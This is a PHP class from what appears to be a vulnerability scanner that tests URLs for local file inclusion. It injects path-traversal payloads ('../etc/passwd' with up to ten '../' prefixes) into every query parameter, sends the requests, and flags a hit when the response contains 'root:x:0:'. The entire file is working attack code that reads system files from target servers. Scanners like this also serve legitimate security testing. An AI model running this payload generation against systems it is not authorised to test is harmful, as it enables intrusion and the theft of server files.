<?php

namespace Aszone\Vulnerabilities;

use GuzzleHttp\ClientInterface;
use Psr\Log\LoggerInterface;
use Aszone\Vulnerabilities\Log\Logger;

class LocalFileInclusion implements VulnerabilityScanner
{
    const EXPLOIT1 = '../etc/passwd';
    const EXPLOIT2 = '../etc/groups';
    const EXPLOIT1REGEX = 'root:x:0:';
    const EXPLOIT2REGEX = 'root:x:0:';

    private $client;

    private $logger;

    public function __construct(ClientInterface $client, LoggerInterface $logger = null)
    {
        $this->client = $client;

        if (empty($logger)) {
            $logger = new Logger;
        }

        $this->logger = $logger;
    }

    public function isVulnerable($target)
    {
        if ($this->isLfiPossible($target)) {
            return $this->verify($target);
        }

        return false;
    }

    public function isLfiPossible($target)
    {
        return (bool) preg_match("/\?|(.+?)\=/", $target);
    }

    protected function verify($target)
    {
        $urls = $this->generateUrls($target);
        $this->logger->info('\n');

        foreach ($urls as $url) {
            if ($this->attack($url)) {
                $this->logger->info('Is Vull');

                return $url;
            }
        }

        return false;
    }

    protected function attack($url)
    {
        $this->logger->info('.');

        try {
            $body = $this->client->get($url)->getBody()->getContents();

            if ($body
                && $this->checkSuccess($body)
            ) {
                return $url;
            }
        } catch (\Exception $e) {
            $this->logger->error('#');
        }

        return false;
    }

    protected function checkSuccess($body)
    {
        return preg_match('/'.static::EXPLOIT1REGEX.'|'.static::EXPLOIT2REGEX.'/', $body);
    }

    public function generateUrls($target)
    {
        $this->logger->info('.\n'.$target);

        $urls1 = $this->generateUrlsByExploit($target, static::EXPLOIT1);
        $urls2 = $this->generateUrlsByExploit($target, static::EXPLOIT2);

        return array_merge($urls1, $urls2);
    }

    protected function generateUrlsByExploit($target, $exploit)
    {
        $explodeUrl = parse_url($target);
        $explodeQuery = explode('&', $explodeUrl['query']);

        foreach ($explodeQuery as $keyQuery => $query) {
            $explodeQueryEqual = explode('=', $query);
            $wordsValue[$explodeQueryEqual[0]] = $explodeQueryEqual[1];
        }

        foreach ($wordsValue as $keyValue => $value) {
            $urls[] = str_replace($keyValue.'='.$value, $keyValue.'=??????????', $target);
        }

        $urlFinal = [];
        foreach ($urls as $url) {
            $urlFinal[] = str_replace('??????????', $exploit, $url);
            $breakFolder = '../';

            for ($i = 0; $i < 10; ++$i) {
                $urlFinal[] = str_replace('??????????', $breakFolder.$exploit, $url);
                $breakFolder .= '../';
            }
        }

        return $urlFinal;
    }



}
